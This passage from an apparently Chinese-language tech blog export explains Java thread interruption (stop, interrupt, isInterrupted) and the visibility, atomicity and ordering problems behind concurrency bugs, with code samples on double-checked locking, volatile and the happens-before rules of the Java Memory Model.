class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">        checkAccess();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> != Thread.currentThread()) &#123;</span><br><span class="line">            security.checkPermission(SecurityConstants.STOP_THREAD_PERMISSION);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// A zero status value corresponds to "NEW", it can't change to</span></span><br><span class="line">    <span class="comment">// not-NEW because we hold the lock.</span></span><br><span class="line">    <span class="keyword">if</span> (threadStatus != <span class="number">0</span>) &#123;</span><br><span class="line">        resume(); <span class="comment">// Wake up thread if it was suspended; no-op otherwise</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// The VM can handle all thread states</span></span><br><span class="line">    stop0(<span class="keyword">new</span> ThreadDeath());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">(Throwable obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">interrupt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span> != Thread.currentThread())</span><br><span class="line">        checkAccess();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (blockerLock) &#123;</span><br><span class="line">        Interruptible b = blocker;</span><br><span class="line">        <span class="keyword">if</span> (b != <span class="keyword">null</span>) &#123;</span><br><span class="line">            interrupt0();           <span class="comment">// Just to set the interrupt flag</span></span><br><span class="line">            b.interrupt(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt0();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">interrupted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentThread().isInterrupted(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterrupted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isInterrupted(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">isInterrupted</span><span class="params">(<span class="keyword">boolean</span> ClearInterrupted)</span></span>;</span><br></pre></td></tr></table></figure></p><ol><li>stop():<br>虽然 stop() 方法确实可以停止一个正在运行的线程，但我们通过源码可以发现：该方法已被@Deprecated标识,表没该方法已被弃用，不推荐使用。<br>弃用原因：</li></ol><ul><li>调用 stop() 方法会立刻停止 run() 方法中剩余的全部工作，包括在 catch 或 finally 语句中的，并抛出ThreadDeath异常(通常情况下此异常不需要显示的捕获)，因此可能会导致一些清理性的工作的得不到完成，如文件，数据库等的关闭。</li><li>调用 stop() 方法会立即释放该线程所持有的所有的锁，导致数据得不到同步，出现数据不一致的问题。<br>同理还有类似suspend()、resume()方法，本文就不过多介绍这类弃用方法了。</li></ul><ol><li>interrupt():<br>interrupt() 方法是 唯一一个 可以将上面提到中断标志设置为 true 的方法，从上面源码可以看出，这是一个 Thread 类 public的对象方法，所以可以推断出任何线程对象都可以调用该方法，进一步说明就是可以一个线程 interrupt 其他线程，也可以 interrupt自己。其中，中断标识的设置是通过 native 方法 interrupt0 完成的。<br><img src="/img/thread/interrupt0.png" alt="interrupt0"> </li></ol><p>同时，我们关注一下源码注释：<br><img src="/img/thread/threadBlocked.png" alt="threadBlocked"><br>表达为当线程被阻塞在：wait()、join()、sleep()这些方法时，如果被中断，就会抛出 InterruptedException 异常。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">wait</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，这些抛出了InterruptedException异常的方法表明这些是可以中断的。<br>总结：当调用了interrupt()方法，线程的中断标志变为true。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interrupt0();           <span class="comment">// Just to set the interrupt flag即只修改</span></span><br></pre></td></tr></table></figure></p><ol><li>isInterrupted():<br>该方法就是返回中断标识的结果：</li></ol><ul><li>true：线程被中断，</li><li>false：线程没被中断或被清空了中断标识（如何清空我们一会看）<br>拿到这个标识后，线程就可以判断这个标识来执行后续的逻辑</li></ul><ol><li>interrupted():<br>和上面的 isInterrupted() 方法差不多，两个方法都是调用 private 的 isInterrupted() 方法， 唯一差别就是会清空中断标识。常用于当处理线程要被大量中断并且只处理其中一次中断。</li></ol><h2 id="interrupt-方法理解注意："><a href="#interrupt-方法理解注意：" class="headerlink" title="interrupt()方法理解注意："></a>interrupt()方法理解注意：</h2><p>interrupt() 方法仅仅是通知线程，线程有机会执行一些后续操作，同时也可以无视这个通知。被 interrupt 的线程，是怎么收到通知的呢？一种是异<br>常，另一种是主动检测。当线程 A 处于 WAITING、TIMED_WAITING 状态时，如果其他线程调用线程 A 的interrupt() 方法，会使线程 A 返回到 RUNNABLE 状态，同时线程 A 的代码会触发InterruptedException 异常。上面我们提到转换到 WAITING、TIMED_WAITING状态的触发条件，都是调用了类似wait()、join()、sleep() 这样的方法，我们看这些方法的签名，发现都会 throws InterruptedException 这个异常。这个异常的触发条件就是：其他线程调用了该线程的 interrupt() 方法。当线程 A 处于 RUNNABLE 状态时，并且阻塞在 java.nio.channels.InterruptibleChannel上时，如果其他线程调用线程 A 的 interrupt() 方法，线程 A 会触发java.nio.channels.ClosedByInterruptException 这个异常；而阻塞在java.nio.channels.Selector 上时，如果其他线程调用线程 A 的 interrupt() 方法，线程 A的 java.nio.channels.Selector 会立即返回。上面这两种情况属于被中断的线程通过异常的方式获得了通知。还有一种是主动检测，如果线程处于 RUNNABLE 状态，并且没有阻塞在某个 I/O 操作上，例如中断计算圆周率的线程 A，这时就得依赖线程 A 主动检测中断状态了。如果其他线程调用线程 A 的interrupt()方法，那么线程 A 可以通过 isInterrupted() 方法，检测是不是自己被中断了。</p><font color='red'>即抛出异常throws InterruptedException的方法实现线程中断，interrupt方法用于通知中断</font>]]></content>
      
      
      <categories>
          
          <category> 并发编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 并发编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程初步认识与基础理论（一）</title>
      <link href="/2020/11/25/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/11/25/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86%E4%B8%8E%E5%9F%BA%E7%A1%80%E7%90%86%E8%AE%BA%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="学习资源总结来源"><a href="#学习资源总结来源" class="headerlink" title="学习资源总结来源"></a>学习资源总结来源</h2><p>感谢这位大佬课程的教育与分享，从中我得以管中窥豹一番，本文为并发编程基础理论的个人总结笔记，欢迎大家于下方链接去学习更全面的Java并发编程知识。<br>来源：<a href="https://time.geekbang.org/column/intro/159?utm_campaign=guanwang&amp;utm_source=baidu-ad&amp;utm_medium=ppzq-pc&amp;utm_content=title&amp;utm_term=baidu-ad-ppzq-title" target="_blank" rel="noopener">https://time.geekbang.org/column/intro/159?utm_campaign=guanwang&amp;utm_source=baidu-ad&amp;utm_medium=ppzq-pc&amp;utm_content=title&amp;utm_term=baidu-ad-ppzq-title</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>为什么我们需要并发编程？我们使用并发编程肯定是因为他能为我们带来计算机任务运行效率的提升，让我们先回顾一下计算机组成原理，关注其中的CPU、内存、 I/O设备。我们知道CPU负责运算和处理不能存储数据,内存负责交换数据本身有一定的内存空间,I/O设备负责吧数据、指令及某些标志信息以及处理结果输入计算机或输出表示出来。</p><p>这三者间的速度差异巨大，CPU 和内存的速度差异可以形象地描述为：CPU 是天上一天，内存是地上一年（假设 CPU 执行一条普通指令需要一天，那么 CPU 读写内存得等待一年的时间）。内存和 I/O 设备的速度差异就更大了，内存是天上一天，I/O 设备是地上十年。</p><p>程序里大部分语句都要访问内存，有些还要访问 I/O，根据木桶理论（一只水桶能装多少水取决于它最短的那块木板），程序整体的性能取决于最慢的操作——读写 I/O 设备，也就是说单方面提高 CPU 性能是无效的。从性能角度讲，我们为了提高执行一定计算机任务的效率，在IO等待的时候不能让CPU闲这，我们把任务拆分交替执行，于是我们有了分时操作系统即此出现了并发，后来多核CPU使得计算机可以并行(同时处理多个任务)这时我们便需要对任务分配进行组织编排，也就是对线程组织编排。</p><p>这时线程之间需要通信，于是操作系统提供了一些让进程，线程之间通信的方式使得任务之间可以更有效的协作(一个线程执行完了唤醒其他线程通知他们执行)。但是事物总不是完美的。并发和通信带来了较高的编程复杂度，同时也出现了多线程并发操作共享资源的问题。于是天下大势，分久必合，我们又要将对共享资源的访问串行化(原因见后文常见并发问题，简要说可参考类似一个线程还未执行完其他线程使用线程共享对象资源导致预计与结果不一致的行为)。所以我们根据现实世界的做法设计了了锁，信号量等等来补充这套体系。</p><h2 id="并发问题源头"><a href="#并发问题源头" class="headerlink" title="并发问题源头"></a>并发问题源头</h2><h3 id="源头一：缓存导致的可见性问题"><a href="#源头一：缓存导致的可见性问题" class="headerlink" title="源头一：缓存导致的可见性问题"></a>源头一：缓存导致的可见性问题</h3><p>一个线程对共享变量的修改，另外一个线程能够立刻看到，我们称为可见性。</p><p>在单核时代，所有的线程都是在一颗 CPU 上执行，CPU 缓存与内存的数据一致性容易解决。因为所有线程都是操作同一个 CPU 的缓存，一个线程对缓存的写，对另外一个线程来说一定是可见的。例如在下面的图中，线程 A 和线程 B 都是操作同一个 CPU 里面的缓存，所以线程 A 更新了变量 V 的值，那么线程 B 之后再访问变量 V，得到的一定是 V 的最新值（线程 A 写过的值）。<br><img src="/img/thread/CPU缓存与内存的关系图.png" alt="CPU缓存与内存的关系图"> </p><p>多核时代，每颗 CPU 都有自己的缓存，这时 CPU 缓存与内存的数据一致性就没那么容易解决了，当多个线程在不同的 CPU 上执行时，这些线程操作的是不同的 CPU 缓存。比如下图中，线程 A 操作的是 CPU-1 上的缓存，而线程 B 操作的是 CPU-2 上的缓存，很明显，这个时候线程 A 对变量 V 的操作对于线程 B 而言就不具备可见性了。这个就属于硬件程序员给软件程序员挖的“坑”。<br><img src="/img/thread/多核CPU的缓存与内存关系图.png" alt="多核CPU的缓存与内存关系图"></p><p>下面我们再用一段代码来验证一下多核场景下的可见性问题。下面的代码，每执行一次add10K() 方法，都会循环 10000 次 count+=1 操作。在 calc() 方法中我们创建了两个线程，每个线程调用一次 add10K() 方法，我们来想一想执行 calc() 方法得到的结果应该是多少呢？<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">add10K</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">int</span> idx = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">while</span>(idx++ &lt; <span class="number">10000</span>) &#123;</span><br><span class="line"> count += <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">calc</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">final</span> Test test = <span class="keyword">new</span> Test();</span><br><span class="line"> <span class="comment">// 创建两个线程，执行 add() 操作</span></span><br><span class="line"> Thread th1 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"> test.add10K();</span><br><span class="line"> &#125;);</span><br><span class="line"> Thread th2 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line"> test.add10K();</span><br><span class="line"> &#125;);</span><br><span class="line"> <span class="comment">// 启动两个线程</span></span><br><span class="line"> th1.start();</span><br><span class="line"> th2.start();</span><br><span class="line"> <span class="comment">// 等待两个线程执行结束</span></span><br><span class="line"> th1.join();</span><br><span class="line"> th2.join();</span><br><span class="line"> <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>直觉告诉我们应该是 20000，因为在单线程里调用两次 add10K() 方法，count 的值就是20000，但实际上 calc() 的执行结果是个 10000 到 20000 之间的随机数。为什么呢？我们假设线程 A 和线程 B 同时开始执行，那么第一次都会将 count=0 读到各自的 CPU 缓存里，执行完 count+=1 之后，各自 CPU 缓存里的值都是 1，同时写入内存后，我们会发现内存中是 1，而不是我们期望的 2。之后由于各自的 CPU 缓存里都有了 count 的值，两个线程都是基于 CPU 缓存里的 count 值来计算，所以导致最终 count 的值都是小于20000 的。这就是缓存的可见性问题。循环 10000 次count+=1 操作如果改为循环 1 亿次，你会发现效果更明显，最终 count的值接近 1 亿，而不是 2 亿。如果循环 10000 次，count 的值接近 20000，原因是两个线程不是同时启动的，有一个时差。<br><img src="/img/thread/变量count在CPU缓存和内存的分布图.png" alt="变量count在CPU缓存和内存的分布图"></p><h3 id="源头二-线程切换带来的原子性问题"><a href="#源头二-线程切换带来的原子性问题" class="headerlink" title="源头二:线程切换带来的原子性问题:"></a>源头二:线程切换带来的原子性问题:</h3><p>由于 IO 太慢，早期的操作系统就发明了多进程，即便在单核的 CPU 上我们也可以一边听着歌，一边写Bug，这个就是多进程的功劳。操作系统允许某个进程执行一小段时间，例如 50 毫秒，过了50毫秒操作系统就会重新选择一个进程来执行（我们称为“任务切换”），这个50毫秒称为“时间片”。<br><img src="/img/thread/线程切换示意图.png" alt="线程切换示意图"></p><p>在一个时间片内，如果一个进程进行一个 IO 操作，例如读个文件，这个时候该进程可以把自己标记为“休眠状态”并出让 CPU 的使用权，待文件读进内存，操作系统会把这个休眠的进程唤醒，唤醒后的进程就有机会重新获得 CPU 的使用权了。</p><p>这里的进程在等待 IO 时之所以会释放 CPU 使用权，是为了让 CPU在这段等待时间里可以<br>做别的事情，这样一来CPU的使用率就上来了；此外，如果这时有另外一个进程也读文件，读文件的操作就会排队，磁盘驱动在完成一个进程的读操作后，发现有排队的任务，就会立即启动下一个读操作，这样 IO 的使用率也上来了。</p><p>是不是很简单的逻辑？但是，虽然看似简单，支持多进程分时复用在操作系统的发展史上却具有里程碑意义，Unix 就是因为解决了这个问题而名噪天下的。</p><p>早期的操作系统基于进程来调度 CPU，不同进程间是不共享内存空间的，所以进程要做任务切换就要切换内存映射地址，而一个进程创建的所有线程，都是共享一个内存空间的，所以线程做任务切换成本就很低了。现代的操作系统都基于更轻量的线程来调度，现在我们提到的“任务切换”都是指“线程切换”。</p><p>Java 并发程序都是基于多线程的，自然也会涉及到任务切换，也许你想不到，任务切换竟然也是并发编程里诡异 Bug 的源头之一。任务切换的时机大多数是在时间片结束的时候，我们现在基本都使用高级语言编程，高级语言里一条语句往往需要多条 CPU 指令完成，例如上面代码中的count += 1，至少需要三条 CPU 指令。</p><p>指令 1：首先，需要把变量 count 从内存加载到 CPU 的寄存器；</p><p>指令 2：之后，在寄存器中执行 +1 操作；</p><p>指令 3：最后，将结果写入内存（缓存机制导致可能写入的是 CPU 缓存而不是内存）。</p><p>操作系统做任务切换，可以发生在任何一条 CPU 指令执行完，是的，是 CPU 指令，而不是高级语言里的一条语句。对于上面的三条指令来说，我们假设 count=0，如果线程 A 在指令 1 执行完后做线程切换，线程 A 和线程 B 按照下图的序列执行，那么我们会发现两个线程都执行了 count+=1 的操作，但是得到的结果不是我们期望的 2，而是 1。</p><p><img src="/img/thread/非原子操作的执行路径示意图.png" alt="非原子操作的执行路径示意图"></p><p>我们潜意识里面觉得 count+=1 这个操作是一个不可分割的整体，就像一个原子一样，线程的切换可以发生在 count+=1 之前，也可以发生在 count+=1 之后，但就是不会发生在中间。我们把一个或者多个操作在 CPU 执行的过程中不被中断的特性称为原子性。CPU 能保证的原子操作是 CPU 指令级别的，而不是高级语言的操作符，这是违背我们直觉的地方。因此，很多时候我们需要在高级语言层面保证操作的原子性。</p><h3 id="源头三：编译优化带来的有序性问题"><a href="#源头三：编译优化带来的有序性问题" class="headerlink" title="源头三：编译优化带来的有序性问题"></a>源头三：编译优化带来的有序性问题</h3><p>那并发编程里还有没有其他有违直觉容易导致诡异 Bug 的技术呢？有的，就是有序性。顾名思义，有序性指的是程序按照代码的先后顺序执行。编译器为了优化性能，有时候会改变程序中语句的先后顺序，例如程序中：“a=6；b=7；”编译器优化后可能变成“b=7；a=6；”，在这个例子中，编译器调整了语句的顺序，但是不影响程序的最终结果。不过有时候编译器及解释器的优化可能导致意想不到的 Bug。</p><p>在 Java 领域一个经典的案例就是利用双重检查创建单例对象，例如下面的代码：在获取实例 getInstance() 的方法中，我们首先判断 instance 是否为空，如果为空，则锁定 Singleton.class 并再次检查 instance 是否为空，如果还为空则创建 Singleton 的一个实例。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">static</span> Singleton instance;</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">​    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">​      <span class="keyword">synchronized</span>(Singleton<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">​        <span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">​          instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">​    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>假设有两个线程 A、B 同时调用 getInstance() 方法，他们会同时发现 instance == null ，于是同时对 Singleton.class 加锁，此时 JVM 保证只有一个线程能够加锁成功（假设是线程 A），另外一个线程则会处于等待状态（假设是线程 B）；线程 A 会创建一个 Singleton 实例，之后释放锁，锁释放后，线程 B 被唤醒，线程 B 再次尝试加锁，此时是可以加锁成功的，加锁成功后，线程 B 检查 instance == null 时会发现，已经创建过 Singleton 实例了，所以线程 B 不会再创建一个 Singleton 实例。</p><p>这看上去一切都很完美，无懈可击，但实际上这个 getInstance() 方法并不完美。问题出在哪里呢？出在 new 操作上，我们以为的 new 操作应该是：</p><p>分配一块内存 M；</p><p>在内存 M 上初始化 Singleton 对象；</p><p>然后 M 的地址赋值给 instance 变量。</p><p>但是实际上优化后的执行路径却是这样的：</p><p>分配一块内存 M；</p><p>将 M 的地址赋值给 instance 变量；</p><p>最后在内存 M 上初始化 Singleton 对象。</p><p>优化后会导致什么问题呢？我们假设线程 A 先执行 getInstance() 方法，当执行完指令 2 时恰好发生了线程切换，切换到了线程 B 上；如果此时线程 B 也执行 getInstance() 方法，那么线程 B 在执行第一个判断时会发现 instance != null ，所以直接返回 instance，而此时的 instance 是没有初始化过的，如果我们这个时候访问 instance 的成员变量就可能触发空指针异常。</p><p><img src="/img/thread/双重检查创建单例的异常执行路径.png" alt="双重检查创建单例的异常执行路径"></p><h2 id="并发源头问题解决方案"><a href="#并发源头问题解决方案" class="headerlink" title="并发源头问题解决方案"></a>并发源头问题解决方案</h2><h3 id="Java内存模型-JMM-解决可见性问题与有序性问题"><a href="#Java内存模型-JMM-解决可见性问题与有序性问题" class="headerlink" title="Java内存模型(JMM)解决可见性问题与有序性问题"></a>Java内存模型(JMM)解决可见性问题与有序性问题</h3><h4 id="什么是Java内存模型"><a href="#什么是Java内存模型" class="headerlink" title="什么是Java内存模型"></a>什么是Java内存模型</h4><p>你已经知道，导致可见性的原因是缓存，导致有序性的原因是编译优化，那解决可见性、有序性最直接的办法就是禁用缓存和编译优化，但是这样问题虽然解决了，我们程序的性能可就堪忧了。</p><p>合理的方案应该是按需禁用缓存以及编译优化。那么，如何做到“按需禁用”呢？对于并发程序，何时禁用缓存以及编译优化只有程序员知道，那所谓“按需禁用”其实就是指按照程序员的要求来禁用。所以，为了解决可见性和有序性问题，只需要提供给程序员按需禁用缓存和编译优化的方法即可。</p><p>Java 内存模型是个很复杂的规范，可以从不同的视角来解读，站在我们这些程序员的视角，本质上可以理解为，Java 内存模型规范了 JVM 如何提供按需禁用缓存和编译优化的方法。具体来说，这些方法包括 volatile、synchronized 和 final 三个关键字，以及六项Happens-Before 规则，</p><h4 id="Java内存模型版本变动及volatile关键字使用"><a href="#Java内存模型版本变动及volatile关键字使用" class="headerlink" title="Java内存模型版本变动及volatile关键字使用"></a>Java内存模型版本变动及volatile关键字使用</h4><p>在 JDK1.2 之前，Java的内存模型实现总是从主存（即共享内存）读取变量，是不需要进⾏特别的注意的。⽽在当前的 Java 内存模型下，线程可以把变量保存本地内存（⽐如机器的寄存器）中，⽽不是直接在主存中进⾏读写。这就可能造成⼀个线程在主存中修改了⼀个变量的值，⽽另外⼀个线程还继续使⽤它在寄存器中的变量值的拷⻉，造成数据的不⼀致。要解决这个问题，就需要把变量声明为volatile，这就指示 JVM，这个变量是不稳定的，每次使⽤它都到主存中进⾏读取。说⽩了， volatile 关键字的主要作⽤就是保证变量的可⻅性然后还有⼀个作⽤是防⽌指令重排序。<br><img src="/img/thread/JMM.png" alt="java内存模型JMM"><br><img src="/img/thread/volatile.png" alt="volatile保证可见性原理"> </p><h4 id="Happens-Before-规则"><a href="#Happens-Before-规则" class="headerlink" title="Happens-Before 规则"></a>Happens-Before 规则</h4><p>如何理解 Happens-Before 呢？如果望文生义（很多网文也都爱按字面意思翻译成“先行发生”），那就南辕北辙了，Happens-Before 并不是说前面一个操作发生在后续操作的前面，它真正要表达的是：前面一个操作的结果对后续操作是可见的。就像有心灵感应的两个人，虽然远隔千里，一个人心之所想，另一个人都看得到。Happens-Before 规则就是要保证线程之间的这种“心灵感应”。所以比较正式的说法是：Happens-Before 约束了编译器的优化行为，虽允许编译器优化，但是要求编译器优化后一定遵守 Happens-Before 规则。</p><p>Happens-Before 规则应该是 Java 内存模型里面最晦涩的内容了，和程序员相关的规则一共有如下六项，都是关于可见性的。</p><p>恰好前面示例代码涉及到这六项规则中的前三项，为便于你理解，我也会分析上面的示例代码，来看看规则 1、2 和 3 到底该如何理解。至于其他三项，我也会结合其他例子作以说明。</p><ol><li><p>程序的顺序性规则<br>这条规则是指在一个线程中，按照程序顺序，前面的操作 Happens-Before 于后续的任意操作。这还是比较容易理解的，比如刚才那段示例代码，按照程序的顺序，第 6 行代码 “x = 42;” Happens-Before 于第 7 行代码 “v = true;”，这就是规则 1 的内容，也比较符合单线程里面的思维：程序前面对某个变量的修改一定是对后续操作可见的。<br>（为方便你查看，我将那段示例代码在这儿再呈现一遍）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileExample</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">boolean</span> v = <span class="keyword">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">x = <span class="number">42</span>;</span><br><span class="line">v = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reader</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (v == <span class="keyword">true</span>) &#123;</span><br><span class="line"><span class="comment">// 这里 x 会是多少呢？</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>volatile 变量规则<br>这条规则是指对一个 volatile 变量的写操作， Happens-Before 于后续对这个 volatile 变量的读操作。<br>这个就有点费解了，对一个 volatile 变量的写操作相对于后续对这个 volatile 变量的读操作可见，这怎么看都是禁用缓存的意思啊，貌似和 1.5 版本以前的语义没有变化啊？如果单看这个规则，的确是这样，但是如果我们关联一下规则 3，就有点不一样的感觉了。</p></li><li><p>传递性<br>这条规则是指如果 A Happens-Before B，且 B Happens-Before C，那么 A Happens-Before C。<br>我们将规则 3 的传递性应用到我们的例子中，会发生什么呢？可以看下面这幅图：<br><img src="/img/thread/示例代码中的传递性规则.png" alt="示例代码中的传递性规则"> </p></li></ol><p>从图中，我们可以看到：<br>“x=42” Happens-Before 写变量 “v=true” ，这是规则 1 的内容；<br>写变量“v=true” Happens-Before 读变量 “v=true”，这是规则 2 的内容 。<br>再根据这个传递性规则，我们得到结果：“x=42” Happens-Before 读变量“v=true”。这意味着什么呢？<br>如果线程 B 读到了“v=true”，那么线程 A 设置的“x=42”对线程 B 是可见的。也就是说，线程 B 能看到 “x == 42” ，有没有一种恍然大悟的感觉？这就是 1.5 版本对 volatile 语义的增强，这个增强意义重大，1.5 版本的并发工具包（java.util.concurrent）就是靠volatile 语义来搞定可见性的，这个在后面的内容中会详细介绍。</p><ol><li>管程中锁的规则<br>这条规则是指对一个锁的解锁 Happens-Before 于后续对这个锁的加锁。<br>要理解这个规则，就首先要了解“管程指的是什么”。管程是一种通用的同步原语，在 Java 中指的就是 synchronized，synchronized 是 Java 里对管程的实现。<br>管程中的锁在 Java 里是隐式实现的，例如下面的代码，在进入同步块之前，会自动加锁，而在代码块执行完会自动释放锁，加锁以及释放锁都是编译器帮我们实现的。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123; <span class="comment">// 此处自动加锁</span></span><br><span class="line"><span class="comment">// x 是共享变量, 初始值 =10</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.x &lt; <span class="number">12</span>) &#123;</span><br><span class="line"><span class="keyword">this</span>.x = <span class="number">12</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; <span class="comment">// 此处自动解锁</span></span><br></pre></td></tr></table></figure></li></ol><p>所以结合规则4——管程中锁的规则，可以这样理解：假设 x 的初始值是 10，线程 A 执行完代码块后 x 的值会变成 12（执行完自动释放锁），线程 B 进入代码块时，能够看到线程 A 对 x 的写操作，也就是线程 B 能够看到 x==12。这个也是符合我们直觉的，应该不难理解。</p><ol><li><p>线程 start() 